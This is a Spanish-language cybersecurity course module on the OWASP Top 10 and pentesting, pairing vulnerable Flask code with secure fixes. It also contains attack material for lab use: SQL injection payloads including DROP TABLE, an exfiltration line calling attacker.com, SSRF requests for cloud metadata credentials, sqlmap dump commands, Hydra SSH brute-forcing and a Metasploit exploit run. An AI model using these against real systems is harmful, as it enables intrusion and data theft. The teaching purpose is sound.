# CURSO COMPLETO DE CIBERSEGURIDAD - PARTE 5

## MÓDULO 8: OWASP TOP 10 Y SEGURIDAD DE APLICACIONES WEB

### 8.1 OWASP Top 10 (2021) - Visión General

```
┌────────────────────────────────────────────────────────────────┐
│              OWASP TOP 10 - 2021                               │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  A01:2021 – Broken Access Control                    ⬆️ #1    │
│  A02:2021 – Cryptographic Failures                   ⬆️ #2    │
│  A03:2021 – Injection                                ⬇️ #3    │
│  A04:2021 – Insecure Design                          🆕 #4    │
│  A05:2021 – Security Misconfiguration                ⬆️ #5    │
│  A06:2021 – Vulnerable and Outdated Components       ⬆️ #6    │
│  A07:2021 – Identification and Authentication Failures ⬇️ #7  │
│  A08:2021 – Software and Data Integrity Failures     🆕 #8    │
│  A09:2021 – Security Logging and Monitoring Failures  ⬇️ #9   │
│  A10:2021 – Server-Side Request Forgery (SSRF)       🆕 #10   │
│                                                                │
└────────────────────────────────────────────────────────────────┘
```

---

### 8.2 A01 - Broken Access Control

#### 8.2.1 Descripción

**Problema:** Los usuarios pueden acceder a recursos o realizar acciones fuera de sus permisos.

**Ejemplos comunes:**
- Acceder a datos de otros usuarios modificando parámetros
- Elevación de privilegios
- Bypass de controles de acceso
- CORS mal configurado

#### 8.2.2 Ejemplo Vulnerable

```python
# API vulnerable - No verifica propiedad del recurso
@app.route('/api/usuario/<int:user_id>/perfil')
def obtener_perfil(user_id):
    # ❌ VULNERABLE: Cualquiera puede ver cualquier perfil
    usuario = db.query(Usuario).filter_by(id=user_id).first()
    return jsonify(usuario.to_dict())

# Ataque:
# Usuario con ID 5 accede a: /api/usuario/10/perfil
# Ve datos del usuario 10 sin autorización
```

#### 8.2.3 Código Seguro

```python
from flask import session, abort

@app.route('/api/usuario/<int:user_id>/perfil')
def obtener_perfil(user_id):
    # ✅ SEGURO: Verificar que el usuario autenticado es el propietario
    usuario_actual = session.get('user_id')
    
    if usuario_actual != user_id:
        abort(403, "No autorizado para ver este perfil")
    
    usuario = db.query(Usuario).filter_by(id=user_id).first()
    return jsonify(usuario.to_dict())

# Mejor aún: Usar decoradores
from functools import wraps

def requiere_propietario(f):
    @wraps(f)
    def decorated_function(user_id, *args, **kwargs):
        if session.get('user_id') != user_id:
            abort(403)
        return f(user_id, *args, **kwargs)
    return decorated_function

@app.route('/api/usuario/<int:user_id>/perfil')
@requiere_propietario
def obtener_perfil(user_id):
    usuario = db.query(Usuario).filter_by(id=user_id).first()
    return jsonify(usuario.to_dict())
```

#### 8.2.4 Diagrama de Ataque

```
┌─────────────┐                    ┌─────────────┐
│  Atacante   │                    │  Servidor   │
│  (User ID=5)│                    │             │
└──────┬──────┘                    └──────┬──────┘
       │                                  │
       │ GET /api/usuario/5/perfil        │
       │─────────────────────────────────>│
       │                                  │
       │ 200 OK {datos de usuario 5}      │
       │<─────────────────────────────────│
       │                                  │
       │ GET /api/usuario/10/perfil       │
       │─────────────────────────────────>│
       │                                  │
       │ ❌ 200 OK {datos de usuario 10}  │
       │<─────────────────────────────────│
       │  VULNERABILIDAD: Acceso no       │
       │  autorizado a datos de otro user │
       │                                  │
```

---

### 8.3 A02 - Cryptographic Failures

#### 8.3.1 Descripción

**Problema:** Fallas en proteger datos sensibles mediante criptografía.

**Ejemplos:**
- Contraseñas en texto plano
- Uso de algoritmos débiles (MD5, SHA1)
- Transmisión de datos sin cifrar (HTTP en vez de HTTPS)
- Claves hardcodeadas en código

#### 8.3.2 Ejemplo Vulnerable

```python
# ❌ VULNERABLE: Contraseña en texto plano
class Usuario:
    def __init__(self, username, password):
        self.username = username
        self.password = password  # Texto plano en BD
    
    def verificar_password(self, password):
        return self.password == password

# ❌ VULNERABLE: Hash débil
import hashlib
password_hash = hashlib.md5(password.encode()).hexdigest()

# ❌ VULNERABLE: Clave hardcodeada
SECRET_KEY = "mi-clave-super-secreta-123"
```

#### 8.3.3 Código Seguro

```python
import bcrypt
import os
from cryptography.fernet import Fernet

# ✅ SEGURO: Hash de contraseña con bcrypt
class Usuario:
    def __init__(self, username, password):
        self.username = username
        self.password_hash = bcrypt.hashpw(
            password.encode('utf-8'),
            bcrypt.gensalt(rounds=12)
        )
    
    def verificar_password(self, password):
        return bcrypt.checkpw(
            password.encode('utf-8'),
            self.password_hash
        )

# ✅ SEGURO: Cifrado de datos sensibles
class CifradoDatos:
    def __init__(self):
        # Clave desde variable de entorno
        key = os.environ.get('ENCRYPTION_KEY')
        if not key:
            raise ValueError("ENCRYPTION_KEY no configurada")
        self.cipher = Fernet(key.encode())
    
    def cifrar(self, datos):
        return self.cipher.encrypt(datos.encode())
    
    def descifrar(self, datos_cifrados):
        return self.cipher.decrypt(datos_cifrados).decode()

# ✅ SEGURO: Forzar HTTPS
@app.before_request
def forzar_https():
    if not request.is_secure and not app.debug:
        url = request.url.replace('http://', 'https://', 1)
        return redirect(url, code=301)
```

---

### 8.4 A03 - Injection

#### 8.4.1 SQL Injection - Análisis Profundo

**Flujo de ataque:**

```
┌──────────────────────────────────────────────────────────────┐
│                    SQL INJECTION ATTACK                       │
└──────────────────────────────────────────────────────────────┘

1. APLICACIÓN VULNERABLE:
   query = "SELECT * FROM users WHERE username='" + user_input + "'"

2. INPUT NORMAL:
   user_input = "admin"
   query = "SELECT * FROM users WHERE username='admin'"
   ✓ Funciona correctamente

3. INPUT MALICIOSO:
   user_input = "admin' OR '1'='1"
   query = "SELECT * FROM users WHERE username='admin' OR '1'='1'"
                                                    ▲
                                                    └─ Siempre TRUE
   ❌ Retorna TODOS los usuarios

4. INPUT MALICIOSO AVANZADO:
   user_input = "admin'; DROP TABLE users; --"
   query = "SELECT * FROM users WHERE username='admin'; 
            DROP TABLE users; --'"
   ❌ ELIMINA LA TABLA COMPLETA
```

#### 8.4.2 Tipos de SQL Injection

**1. In-band SQLi (Clásico)**
```sql
-- Error-based
' OR 1=1 --
' UNION SELECT NULL, NULL, NULL --

-- Union-based
' UNION SELECT username, password FROM admin_users --
```

**2. Blind SQLi (Sin output visible)**
```sql
-- Boolean-based
' AND 1=1 --  (página normal)
' AND 1=2 --  (página diferente)

-- Time-based
' AND SLEEP(5) --  (respuesta demora 5 segundos)
```

**3. Out-of-band SQLi**
```sql
-- Exfiltración vía DNS
'; EXEC xp_dirtree '\\attacker.com\' --
```

#### 8.4.3 Prevención Completa

```python
# ✅ MÉTODO 1: Prepared Statements (MEJOR)
import psycopg2

def buscar_usuario_seguro(username):
    conn = psycopg2.connect(database="mydb")
    cursor = conn.cursor()
    
    # Usar placeholders %s
    query = "SELECT * FROM users WHERE username = %s"
    cursor.execute(query, (username,))  # Tupla de parámetros
    
    return cursor.fetchall()

# ✅ MÉTODO 2: ORM (SQLAlchemy)
from sqlalchemy import create_engine, Column, String
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker

Base = declarative_base()

class Usuario(Base):
    __tablename__ = 'users'
    username = Column(String, primary_key=True)
    password = Column(String)

engine = create_engine('postgresql://localhost/mydb')
Session = sessionmaker(bind=engine)
session = Session()

# Consulta segura con ORM
usuario = session.query(Usuario).filter_by(username=username).first()

# ✅ MÉTODO 3: Validación de entrada
import re

def validar_username(username):
    # Solo alfanuméricos y guión bajo
    if not re.match(r'^[a-zA-Z0-9_]+$', username):
        raise ValueError("Username inválido")
    return username

# ✅ MÉTODO 4: Principio de mínimo privilegio
# Usuario de BD solo con permisos SELECT, no DROP/DELETE
CREATE USER app_user WITH PASSWORD 'secure_pass';
GRANT SELECT ON users TO app_user;
REVOKE ALL ON users FROM app_user;
GRANT SELECT ON users TO app_user;
```

#### 8.4.4 Laboratorio: Detectar SQL Injection

```bash
# Instalar sqlmap
sudo apt install sqlmap

# Probar aplicación vulnerable
python3 app_vulnerable.py

# Escanear con sqlmap
sqlmap -u "http://localhost:5000/login?username=admin&password=pass" \
  --batch --risk=3 --level=5

# Extraer bases de datos
sqlmap -u "http://localhost:5000/login?username=admin" \
  --dbs

# Extraer tablas
sqlmap -u "http://localhost:5000/login?username=admin" \
  -D mydb --tables

# Extraer datos
sqlmap -u "http://localhost:5000/login?username=admin" \
  -D mydb -T users --dump
```

---

### 8.5 A04 - Insecure Design

#### 8.5.1 Descripción

**Problema:** Fallas de diseño arquitectónico, no de implementación.

**Ejemplos:**
- No implementar rate limiting
- Falta de segregación de funciones
- Ausencia de threat modeling
- No considerar casos de abuso

#### 8.5.2 Ejemplo: Rate Limiting

```python
from flask import Flask, request, jsonify
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import redis

app = Flask(__name__)

# ✅ SEGURO: Implementar rate limiting
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    storage_uri="redis://localhost:6379"
)

# Limitar intentos de login
@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")  # Máximo 5 intentos por minuto
def login():
    username = request.json.get('username')
    password = request.json.get('password')
    
    # Lógica de autenticación
    if verificar_credenciales(username, password):
        return jsonify({"token": generar_token(username)})
    else:
        return jsonify({"error": "Credenciales inválidas"}), 401

# Limitar API pública
@app.route('/api/buscar')
@limiter.limit("100 per hour")  # 100 requests por hora
def buscar():
    query = request.args.get('q')
    resultados = realizar_busqueda(query)
    return jsonify(resultados)
```

#### 8.5.3 Threat Modeling con STRIDE

```
┌────────────────────────────────────────────────────────────┐
│                    STRIDE ANALYSIS                         │
├────────────────────────────────────────────────────────────┤
│                                                            │
│  S - Spoofing (Suplantación)                               │
│      ├─ Amenaza: Atacante se hace pasar por usuario       │
│      └─ Mitigación: MFA, certificados cliente             │
│                                                            │
│  T - Tampering (Manipulación)                              │
│      ├─ Amenaza: Modificar datos en tránsito              │
│      └─ Mitigación: HTTPS, firmas digitales               │
│                                                            │
│  R - Repudiation (Repudio)                                 │
│      ├─ Amenaza: Negar acciones realizadas                │
│      └─ Mitigación: Logs inmutables, blockchain           │
│                                                            │
│  I - Information Disclosure (Divulgación)                  │
│      ├─ Amenaza: Exposición de datos sensibles            │
│      └─ Mitigación: Cifrado, control de acceso            │
│                                                            │
│  D - Denial of Service (Denegación de servicio)           │
│      ├─ Amenaza: Hacer el sistema inaccesible             │
│      └─ Mitigación: Rate limiting, CDN, WAF               │
│                                                            │
│  E - Elevation of Privilege (Elevación de privilegios)     │
│      ├─ Amenaza: Obtener permisos de administrador        │
│      └─ Mitigación: Principio de mínimo privilegio        │
│                                                            │
└────────────────────────────────────────────────────────────┘
```

---

### 8.6 A05 - Security Misconfiguration

#### 8.6.1 Ejemplos Comunes

```python
# ❌ VULNERABLE: Debug mode en producción
app = Flask(__name__)
app.config['DEBUG'] = True  # Expone stack traces

# ❌ VULNERABLE: Mensajes de error detallados
@app.errorhandler(500)
def error_handler(e):
    return str(e), 500  # Expone información del sistema

# ❌ VULNERABLE: CORS permisivo
from flask_cors import CORS
CORS(app, resources={r"/*": {"origins": "*"}})

# ❌ VULNERABLE: Headers de seguridad faltantes
# Sin X-Frame-Options, CSP, etc.
```

#### 8.6.2 Configuración Segura

```python
from flask import Flask
from flask_talisman import Talisman

app = Flask(__name__)

# ✅ SEGURO: Configuración de producción
app.config['DEBUG'] = False
app.config['TESTING'] = False
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY')

# ✅ SEGURO: Headers de seguridad
Talisman(app, 
    force_https=True,
    strict_transport_security=True,
    content_security_policy={
        'default-src': "'self'",
        'script-src': "'self' 'unsafe-inline'",
        'style-src': "'self' 'unsafe-inline'"
    }
)

# ✅ SEGURO: CORS restrictivo
from flask_cors import CORS
CORS(app, resources={
    r"/api/*": {
        "origins": ["https://miapp.com"],
        "methods": ["GET", "POST"],
        "allow_headers": ["Content-Type", "Authorization"]
    }
})

# ✅ SEGURO: Manejo de errores genérico
@app.errorhandler(500)
def error_handler(e):
    # Log del error real (interno)
    app.logger.error(f"Error: {str(e)}")
    # Mensaje genérico al usuario
    return "Error interno del servidor", 500
```

#### 8.6.3 Checklist de Hardening

```bash
# Nginx Security Headers
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Referrer-Policy "no-referrer-when-downgrade" always;
add_header Content-Security-Policy "default-src 'self'" always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;

# Deshabilitar información del servidor
server_tokens off;

# Limitar tamaño de request
client_max_body_size 10M;

# Timeout de conexión
client_body_timeout 12;
client_header_timeout 12;
keepalive_timeout 15;
send_timeout 10;
```

---

### 8.7 A06 - Vulnerable and Outdated Components

#### 8.7.1 Gestión de Dependencias

```bash
# Python - Verificar vulnerabilidades
pip install safety
safety check

# Actualizar dependencias
pip list --outdated
pip install --upgrade package_name

# Node.js - Auditoría
npm audit
npm audit fix

# Java - OWASP Dependency Check
mvn org.owasp:dependency-check-maven:check
```

#### 8.7.2 Ejemplo con Dependabot (GitHub)

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "daily"
```

---

### 8.8 A10 - Server-Side Request Forgery (SSRF)

#### 8.8.1 Descripción

**Problema:** El servidor realiza requests a URLs controladas por el atacante.

#### 8.8.2 Ejemplo Vulnerable

```python
import requests

# ❌ VULNERABLE: SSRF
@app.route('/fetch-url')
def fetch_url():
    url = request.args.get('url')
    # Atacante puede acceder a recursos internos
    response = requests.get(url)
    return response.text

# Ataque:
# /fetch-url?url=http://localhost:8080/admin
# /fetch-url?url=http://169.254.169.254/latest/meta-data/
# (AWS metadata - obtiene credenciales)
```

#### 8.8.3 Código Seguro

```python
from urllib.parse import urlparse
import ipaddress

def es_url_segura(url):
    """Valida que la URL no apunte a recursos internos"""
    try:
        parsed = urlparse(url)
        
        # Solo permitir HTTP/HTTPS
        if parsed.scheme not in ['http', 'https']:
            return False
        
        # Resolver hostname a IP
        import socket
        ip = socket.gethostbyname(parsed.hostname)
        ip_obj = ipaddress.ip_address(ip)
        
        # Bloquear IPs privadas y localhost
        if ip_obj.is_private or ip_obj.is_loopback:
            return False
        
        # Bloquear metadata de cloud providers
        if ip == '169.254.169.254':  # AWS metadata
            return False
        
        return True
    except:
        return False

# ✅ SEGURO: Validar URL
@app.route('/fetch-url')
def fetch_url():
    url = request.args.get('url')
    
    if not es_url_segura(url):
        return "URL no permitida", 403
    
    # Whitelist de dominios permitidos
    dominios_permitidos = ['api.ejemplo.com', 'cdn.ejemplo.com']
    parsed = urlparse(url)
    
    if parsed.hostname not in dominios_permitidos:
        return "Dominio no autorizado", 403
    
    response = requests.get(url, timeout=5)
    return response.text
```

---

## MÓDULO 9: PENTESTING Y ETHICAL HACKING

### 9.1 Metodología de Pentesting

```
┌────────────────────────────────────────────────────────────┐
│           FASES DEL PENTESTING                             │
├────────────────────────────────────────────────────────────┤
│                                                            │
│  1. RECONOCIMIENTO (Reconnaissance)                        │
│     ├─ Pasivo: OSINT, Google Dorking, Shodan              │
│     └─ Activo: Escaneo de puertos, enumeración            │
│                                                            │
│  2. ESCANEO (Scanning)                                     │
│     ├─ Nmap, Nessus, OpenVAS                              │
│     └─ Identificar servicios y versiones                   │
│                                                            │
│  3. ENUMERACIÓN (Enumeration)                              │
│     ├─ Usuarios, recursos compartidos, servicios          │
│     └─ Recopilar información detallada                     │
│                                                            │
│  4. EXPLOTACIÓN (Exploitation)                             │
│     ├─ Metasploit, exploits públicos                       │
│     └─ Obtener acceso inicial                              │
│                                                            │
│  5. POST-EXPLOTACIÓN (Post-Exploitation)                   │
│     ├─ Escalación de privilegios                           │
│     ├─ Movimiento lateral                                  │
│     └─ Persistencia                                        │
│                                                            │
│  6. REPORTE (Reporting)                                    │
│     ├─ Documentar hallazgos                                │
│     ├─ Clasificar por severidad                            │
│     └─ Recomendar remediaciones                            │
│                                                            │
└────────────────────────────────────────────────────────────┘
```

### 9.2 Herramientas Esenciales

```bash
# Kali Linux - Distribución para pentesting
# Descargar de kali.org

# Herramientas incluidas:
- Nmap: Escaneo de puertos
- Metasploit: Framework de explotación
- Burp Suite: Proxy de interceptación
- Wireshark: Análisis de tráfico
- John the Ripper: Cracking de contraseñas
- Hydra: Fuerza bruta
- SQLmap: SQL injection
- Nikto: Escaneo de vulnerabilidades web
- Aircrack-ng: Auditoría WiFi
```

### 9.3 Laboratorio: Pentesting Completo

```bash
# 1. Reconocimiento
whois ejemplo.com
nslookup ejemplo.com
dig ejemplo.com ANY

# 2. Escaneo de puertos
nmap -sV -sC -O -p- ejemplo.com -oA scan_completo

# 3. Escaneo de vulnerabilidades web
nikto -h http://ejemplo.com

# 4. Fuerza bruta SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  ssh://ejemplo.com

# 5. Explotar vulnerabilidad
msfconsole
use exploit/unix/webapp/php_cgi_arg_injection
set RHOST ejemplo.com
exploit
```

